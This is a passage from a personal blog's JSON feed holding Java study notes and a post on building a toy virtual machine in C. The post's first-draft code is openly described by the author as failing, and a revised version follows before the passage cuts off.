中的另一个重要的面向对象编程概念。它指的是同一个方法在不同的对象上可以有不同的实现方式。Java 中的多态可以通过方法重载和方法重写来实现。</p>\n<p>方法重载指的是在同一个类中定义两个或多个方法，它们具有相同的方法名但是参数列表不同。方法重写指的是在子类中重新定义一个和父类中相同名称和参数列表的方法。重载方法允许你使用同样的名字来定义不同的方法，只要它们的参数列表是不同的。Java 根据方法签名决定使用哪个方法 (当编译器无法判断哪个是最精确的匹配时会产生歧义调用)</p>\n<p>[^ 方法签名指的是一个方法的名称、参数数量和参数类型的组合。方法签名可以用于重载方法，即在同一个类中定义多个同名但参数列表不同的方法。Java 要求方法签名必须唯一，否则编译器会报错。]:</p>\n<h2 id=\"杂\"><a class=\"markdownIt-Anchor\" href=\"#杂\">#</a> 杂</h2>\n<p>讲访问级别修饰符的 https://blog.csdn.net/aimeimeits/article/details/54136219</p>\n<p>每个 java 程序至少应该有一个类</p>\n<p>一个源文件中只能有一个 public 类</p>\n<p>一个源文件可以有多个非 public 类</p>\n<p>源文件的名称应该和 public 类的类名保持一致。例如：源文件中 public 类的类名是 Employee，那么源文件应该命名为 Employee.java。</p>\n<p>程序是从 main 方法开始执行的</p>\n<p>使用 Math 类中的方法求解数学问题:abs 方法返回一个数 (int,long,float 或 double 型) 的绝对值</p>\n<p>random () 方法生成大于等于 0.0 且小于 1.0 的 double 型随机数</p>\n<p>比较和测试字符用 Character 类的方法</p>\n<p>this 引用数据域，this 调用构造方法</p>\n<p>格式化控制台输出 System.out.printf</p>\n<p><strong>java 支持 foreach 循环</strong> 从而不使用下标变量就可以顺序遍历整个数组</p>\n<p>语法如下：</p>\n<pre><code>for (元素类型 元素变量 : 数组或集合) &#123;\n    // 循环体\n&#125;\n</code></pre>\n<p>其中， <code>元素类型</code>  指的是数组或集合中元素的类型， <code>元素变量</code>  是循环遍历过程中每个元素的变量名， <code>数组或集合</code>  是要遍历的对象。</p>\n<p>以下是一个使用 foreach 循环遍历数组的例子：</p>\n<pre><code>int[] numbers = &#123;1, 2, 3, 4, 5&#125;;\nfor (int number : numbers) &#123;\n    System.out.println(number);\n&#125;\n</code></pre>\n<p>java.util.Arrays 类包含一些实用的方法用于数组操作，比如排序和查找</p>\n<p><strong>定义一个标准的类</strong></p>\n<p>一个标准的类通常要拥有四个组成部分:</p>\n<p>1. 所有的成员变量都要使用 private 关键字修饰</p>\n<p>2. 为每一个成员变量编写一对 getter/setter 方法</p>\n<p>3. 编写一个无参数的构造方法</p>\n<p>4. 编写一个全参数的构造方法</p>\n<p>[^ 这样标准的类叫做 Java Bean]:</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/03/19/Write-Virtual-Machine/",
            "url": "https://3cly.github.io/2023/03/19/Write-Virtual-Machine/",
            "title": "Write Virtual Machine",
            "date_published": "2023-03-19T03:15:55.000Z",
            "content_html": "<h1 id=\"编写自己的虚拟机\"><a class=\"markdownIt-Anchor\" href=\"#编写自己的虚拟机\">#</a> 编写自己的虚拟机</h1>\n<h2 id=\"什么是虚拟机\"><a class=\"markdownIt-Anchor\" href=\"#什么是虚拟机\">#</a> 什么是虚拟机</h2>\n<img data-src=\"\\images\\p272648921.jpg\" alt=\"p272648921\" style=\"zoom: 50%;\">\n<h2 id=\"虚拟机的硬件组件的模拟\"><a class=\"markdownIt-Anchor\" href=\"#虚拟机的硬件组件的模拟\">#</a> 虚拟机的硬件组件的模拟</h2>\n<h3 id=\"内存空间\"><a class=\"markdownIt-Anchor\" href=\"#内存空间\">#</a> 内存空间</h3>\n<p>虚拟机中模拟内存硬件的作用是为了在一个完全隔离的环境中运行一个完整的计算机系统</p>\n<h3 id=\"寄存器\"><a class=\"markdownIt-Anchor\" href=\"#寄存器\">#</a> 寄存器</h3>\n<p>一个寄存器就是 CPU 上一个能够存储单个数据的槽。<strong>寄存器就像 CPU 的 “工作台”</strong>。<strong>CPU 要对一段数据进行处理，必须先将数据放到某个寄存器中</strong>。但因为寄存器的数量很少，因此在任意时刻只能有很少的数据加载到寄存器。计算机的解决办法是：首先将数据从内存加载到寄存器，然后将计算结果放到其他寄存器，最后将最终结果 再写回内存。</p>\n<h3 id=\"指令集\"><a class=\"markdownIt-Anchor\" href=\"#指令集\">#</a> 指令集</h3>\n<p>指令是告诉 CPU 执行一些基本任务的命令，例如将两个数字相加。指令既有指示要执行的任务类型的<strong>操作码</strong>，也有一组为正在执行的任务提供输入的<strong>参数。</strong></p>\n<p>每个<strong>操作码</strong>代表 CPU “知道” 如何执行的一项任务。</p>\n<h3 id=\"条件标志位\"><a class=\"markdownIt-Anchor\" href=\"#条件标志位\">#</a> 条件标志位</h3>\n<p><code>R_COND</code>  寄存器存储条件标记，其中记录了最近一次计算的执行结果。 这使得程序可以完成诸如  <code>if (x &gt; 0) &#123; ... &#125;</code>  之类的逻辑条件。</p>\n<p>每个 CPU 都有很多条件标志位来表示不同的情形。</p>\n<h2 id=\"一些原理\"><a class=\"markdownIt-Anchor\" href=\"#一些原理\">#</a> 一些原理</h2>\n<h3 id=\"机器码\"><a class=\"markdownIt-Anchor\" href=\"#机器码\">#</a> 机器码</h3>\n<p>一种称为 <strong>汇编器</strong>（assembler）的工具会<strong>将这些文本格式的指令转换成 16 比特的二进制指令， 后者是虚拟机可以理解的</strong>。这种二进制格式称为机器码（machine code），是虚拟机可以执行的格式，其本质上就是一个 16 比特指令组成的数组。</p>\n<p><img data-src=\"/images/assembler.png\" alt=\"image.png\"></p>\n<h3 id=\"中断异常trap的了解\"><a class=\"markdownIt-Anchor\" href=\"#中断异常trap的了解\">#</a> 中断，异常，trap 的了解</h3>\n<p>这几个我都还没做 233</p>\n<p><img data-src=\"/images/image-20230317165448823.png\" alt=\"image.png\"></p>\n<h2 id=\"探索实现x86架构的虚拟机c语言\"><a class=\"markdownIt-Anchor\" href=\"#探索实现x86架构的虚拟机c语言\">#</a> 探索 &amp; 实现 x86 架构的虚拟机 (C 语言)</h2>\n<p>基于 x86 架构的虚拟机实现可以分为以下几个步骤：</p>\n<ul>\n<li>\n<p>设计虚拟机的结构</p>\n</li>\n<li>\n<p>编写虚拟机的初始化和运行函数</p>\n</li>\n<li>\n<p>编写虚拟机的指令集的各指令的实现函数和执行虚拟机的函数</p>\n</li>\n</ul>\n<h3 id=\"虚拟机的基本结构\"><a class=\"markdownIt-Anchor\" href=\"#虚拟机的基本结构\">#</a> 虚拟机的基本结构</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 定义虚拟机的内存大小</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MEM_SIZE</span> <span class=\"token expression\"><span class=\"token number\">512</span></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 定义虚拟机支持的指令集</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    HLT<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 停止执行</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    MOV<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 移动数据</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    ADD<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 加法运算</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    SUB<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 减法运算</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    JMP<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 无条件跳转</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    JZ<span class=\"token punctuation\">,</span>  <span class=\"token comment\">// 条件跳转（如果零标志为真）</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    JNZ<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 条件跳转（如果零标志为假）</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">// 定义虚拟机支持的寄存器</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    R0 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    R1<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    R2<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    R3<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    PC<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 程序计数器</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    SP<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 栈指针</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    FLG<span class=\"token punctuation\">,</span><span class=\"token comment\">// 标志寄存器（用于保存比较结果）</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">// 定义虚拟机结构体，包含内存、寄存器和运行状态等字段</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> mem<span class=\"token punctuation\">[</span>MEM_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 内存空间，每个单元 8 位（1 字节）</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token class-name\">uint16_t</span> reg<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 寄存器数组，每个寄存器 16 位（2 字节）</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">int</span> running<span class=\"token punctuation\">;</span>             <span class=\"token comment\">// 运行状态，0 表示停止，1 表示运行中</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span> VM<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">// 创建并初始化一个虚拟机实例，并返回指针</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>VM<span class=\"token operator\">*</span> <span class=\"token function\">vm_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    VM<span class=\"token operator\">*</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>VM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 分配内存空间给虚拟机实例</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 将程序计数器置为 0（从内存地址 0 开始执行）</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> MEM_SIZE <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 将栈指针置为内存最高地址 - 2（栈从高地址向低地址增长）</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// 将标志寄存器置为 0（无比较结果）</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    vm<span class=\"token operator\">-></span>running <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 将运行状态置为 1（开始执行）</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>     <span class=\"token comment\">// 初始化其他寄存器为 0</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R0<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R1<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R3<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\">// 加载一段程序到虚拟机的内存中，并返回加载后的程序长度（字节数）</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">vm_load</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">,</span> <span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span> prog<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                        <span class=\"token comment\">// 初始化程序长度为 0</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>prog <span class=\"token operator\">!=</span> HLT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>              <span class=\"token comment\">// 循环读取程序字节，直到遇到 HLT 指令</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>prog<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将当前字节写入虚拟机内存中，相对于程序计数器的偏移地址</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        prog<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                         <span class=\"token comment\">// 指向下一个字节</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        len<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                          <span class=\"token comment\">// 程序长度加 1</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> HLT<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 将 HLT 指令写入虚拟机内存中，作为程序的结束标志</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">return</span> len <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>                     <span class=\"token comment\">// 返回程序长度（包含 HLT 指令）</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"执行函数\"><a class=\"markdownIt-Anchor\" href=\"#执行函数\">#</a> 执行函数</h3>\n<p>本来想在 case 里面定义 dst src 缓存变量的，结果 vscode 一直报错 只好提前定义了</p>\n<pre><code>// 定义一个执行函数，接受一个虚拟机实例作为参数\nvoid vm_exec(VM* vm) &#123;\n    uint8_t dst;//焯了 本来想在case里面定义的\n    uint8_t src;\n    while (vm-&gt;running) &#123; // 循环执行，直到运行状态为0\n        uint8_t op = vm-&gt;mem[vm-&gt;reg[PC]]; // 从内存中读取当前指令\n        switch (op) &#123; // 根据指令类型进行分支处理\n            case HLT: // 停止执行\n                vm-&gt;running = 0; // 将运行状态置为0\n                break;\n            case MOV: // 移动数据\n                dst = vm-&gt;mem[vm-&gt;reg[PC] + 1]; // 读取目标寄存器编号（第一个操作数）\n                src = vm-&gt;mem[vm-&gt;reg[PC] + 2]; // 读取源寄存器编号（第二个操作数）\n                vm-&gt;reg[dst] = vm-&gt;reg[src]; // 将源寄存器的值赋给目标寄存器\n                vm-&gt;reg[PC] += 3; // 将程序计数器增加3（跳过指令和操作数）\n                break;\n            case ADD: // 加法运算\n                dst = vm-&gt;mem[vm-&gt;reg[PC] + 1]; // 读取目标寄存器编号（第一个操作数）\n                src = vm-&gt;mem[vm-&gt;reg[PC] + 2]; // 读取源寄存器编号（第二个操作数）\n                uint16_t res = vm-&gt;reg[dst] + vm-&gt;reg[src]; // 计算两个寄存器的值之和，并保存在16位变量中\n                if (res == 0) &#123; // 如果结果为0，则将零标志置为1，否则置为0\n                    vm-&gt;reg[FLG] = 1;\n                &#125; else &#123;\n                    vm-&gt;reg[FLG] = 0;\n                &#125;   \n            &#125;\n            break;\n        &#125;\n    &#125;\n</code></pre>\n<h3 id=\"测试用函数\"><a class=\"markdownIt-Anchor\" href=\"#测试用函数\">#</a> 测试用函数</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 一个测试函数，接受一个虚拟机实例作为参数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">vm_test</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">// 定义一段测试程序，包含以下指令：</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// MOV R0, 10   // 将 10 赋给寄存器 R0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// MOV R1, 20   // 将 20 赋给寄存器 R1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// ADD R2, R0   // 将寄存器 R0 和 R1 的值相加，并赋给寄存器 R2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// HLT          // 停止执行</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> prog<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>MOV<span class=\"token punctuation\">,</span> R0<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> MOV<span class=\"token punctuation\">,</span> R1<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> ADD<span class=\"token punctuation\">,</span> R2<span class=\"token punctuation\">,</span> R0<span class=\"token punctuation\">,</span> HLT<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token function\">vm_load</span><span class=\"token punctuation\">(</span>vm<span class=\"token punctuation\">,</span> prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 加载测试程序到虚拟机内存中，并获取程序长度</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Loaded %d bytes of program.\\n\"</span><span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 打印程序长度</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">vm_exec</span><span class=\"token punctuation\">(</span>vm<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 执行虚拟机</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Register values:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 打印寄存器的值</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"R%d: %d\\n\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Execution finished.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 打印执行结束</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token function\">vm_test</span><span class=\"token punctuation\">(</span> <span class=\"token function\">vm_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>运行结果出错了我焯</p>\n<p><strong>mov 指令实现有问题</strong>:mov 指令分情况哇，一种是立即数赋给寄存器 一种是寄存器给寄存器</p>\n<p>然后虚拟机的初始化有问题 <strong>指令读取有问题</strong></p>\n<h3 id=\"改变思路解决问题\"><a class=\"markdownIt-Anchor\" href=\"#改变思路解决问题\">#</a> 改变思路解决问题</h3>\n<p><img data-src=\"/images/image-20230317205054119.png\" alt=\"image.png\"></p>\n<p>看之前做过的 vm 逆向题目 发现多了一个数来判断的 于是改变思路 模仿着这道题写虚拟机</p>\n<h3 id=\"完善后的代码\"><a class=\"markdownIt-Anchor\" href=\"#完善后的代码\">#</a> 完善后的代码</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 定义虚拟机的内存大小</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MEM_SIZE</span> <span class=\"token expression\"><span class=\"token number\">512</span></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 定义虚拟机支持的指令集</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    MOV<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 移动数据</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    PUSH<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    POP<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    ALU<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    CMP<span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    JMP<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tJNE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tJE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    SUB<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    HLT<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">// 定义虚拟机支持的寄存器</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    R0<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    R1<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    R2<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    R3<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    R4<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    PC<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 程序计数器</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    SP<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 栈指针</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    FLG<span class=\"token punctuation\">,</span><span class=\"token comment\">// 